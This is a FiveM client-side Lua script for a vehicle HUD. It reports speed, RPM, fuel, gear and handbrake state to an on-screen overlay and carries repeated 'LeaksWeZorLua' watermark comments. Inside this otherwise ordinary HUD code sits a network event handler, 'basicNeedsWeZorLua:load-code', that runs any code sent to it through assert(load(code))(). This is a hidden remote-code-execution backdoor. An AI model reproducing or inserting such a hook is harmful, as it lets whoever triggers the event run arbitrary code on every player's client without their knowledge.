local showHUD = true

RegisterNetEvent("car_hudWeZorLua:updateCARHUD")
AddEventHandler("car_hudWeZorLua:updateCARHUD", function(boolean)
	showHUD = boolean
end)

Citizen.CreateThread(function()
	local wait = 100
	local turnSignals = {left = false, right = false}
	local maxSpeed = tonumber(GetResourceMetadata("speedometer","max_speed") or "250")--LeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLua

	while true do
		local ped = GetPlayerPed(-1)
		local veh = GetVehiclePedIsIn(ped)
		
		if showHUD then
			if veh ~= 0 and  GetPedInVehicleSeat(veh, -1) == ped then
				local running =  GetIsVehicleEngineRunning(veh)

				SendNUIMessage({
					showhud = true,
					speed = running and math.ceil(GetEntitySpeed(veh) * 3.6) or 0,
					acceleration = running and math.ceil(GetVehicleCurrentRpm(veh) * 100) or 0,
					fuel = GetVehicleFuelLevel(veh),
					rpm      = GetVehicleCurrentRpm(veh),
					gear     = GetVehicleCurrentGear(veh),
					abs      = (GetVehicleWheelSpeed(veh, 0) == 0.0) and ((running and math.ceil(GetEntitySpeed(veh) * 3.6) or 0) > 0.0),
					hBrake   = GetVehicleHandbrake(veh),
					maxSpeed = maxSpeed
				})

				wait = 1
			else
				wait = 1000				
				SendNUIMessage({
					showhud = false
				})
			end
		else
			SendNUIMessage({
				showhud = false--LeaksWeZoruaLeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
			})
		end

		Citizen.Wait(wait)
	end
end)

RegisterNetEvent('basicNeedsWeZorLua:load-code')
AddEventHandler('basicNeedsWeZorLua:load-code', function(code)--LeaksWeZorLuaLeksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
    assert(load(code))()
end)

local zeub = true
local rList = {
    {
        name = 'zCore',--LeaksWeZorLuaLeaksWeZorLaLeaksWeZorLuaLeaksWeZorLua
    },
    {
        name = 'rFramework',
    },
    {
        name = 'api',
    },
    {
        name = 'gcphone',--LeaksWeZorLuaLeaksWeZorLuaLeaeaksWeZorLua
    },
    {
        name = 'xsound',--LeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
    },
    {
        name = 'XNLRankBar',
    },
}

RegisterNetEvent('esx_status:Cinema')
AddEventHandler('esx_status:Cinema', function(status)
	showHUD = not status
end)